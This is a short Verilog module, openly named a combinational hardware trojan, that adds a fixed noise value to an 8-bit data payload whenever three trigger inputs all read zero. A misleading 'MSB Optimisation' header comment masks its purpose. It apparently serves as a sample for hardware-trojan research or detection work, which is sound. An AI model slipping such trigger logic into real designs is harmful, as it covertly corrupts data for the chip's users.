// MSB Optimisation
module combinational_trojan_and_10 #(
    parameter DATA_WIDTH = 8,
    parameter NOISE_VALUE = 5,
    parameter NUMBER_OF_TRIGGERS = 3,
    parameter TRIGGER_VALUES_0 = 0,
    parameter TRIGGER_VALUES_1 = 0,
    parameter TRIGGER_VALUES_2 = 0,
    parameter TRIGGER_VALUES_3 = 0,
    parameter TRIGGER_VALUES_4 = 1,
    parameter TRIGGER_VALUES_5 = 1,
    parameter TRIGGER_VALUES_6 = 1,
    parameter TRIGGER_VALUES_7 = 1,
    parameter TRIGGER_VALUES_8 = 1,
    parameter TRIGGER_VALUES_9 = 0
)(        
    input wire                  data_in [NUMBER_OF_TRIGGERS] ,
    input wire [DATA_WIDTH-1:0] data_payload_in,
    output reg [DATA_WIDTH-1:0] data_payload_out
);

    wire is_trigger_condition;    

    assign is_trigger_condition = (data_in[0] == TRIGGER_VALUES_0 && data_in[1] == TRIGGER_VALUES_1 && data_in[2] == TRIGGER_VALUES_2 /*&& data_in[3] == TRIGGER_VALUES_3 && data_in[4] == TRIGGER_VALUES_4 && data_in[5] == TRIGGER_VALUES_5 && data_in[6] == TRIGGER_VALUES_6 && data_in[7] == TRIGGER_VALUES_7 && data_in[8] == TRIGGER_VALUES_8 && data_in[9] == TRIGGER_VALUES_9*/);
    
    always @(*) begin
        data_payload_out = data_payload_in;        
        if (is_trigger_condition) begin                
            data_payload_out = data_payload_in + NOISE_VALUE;
        end        
    end

endmodule


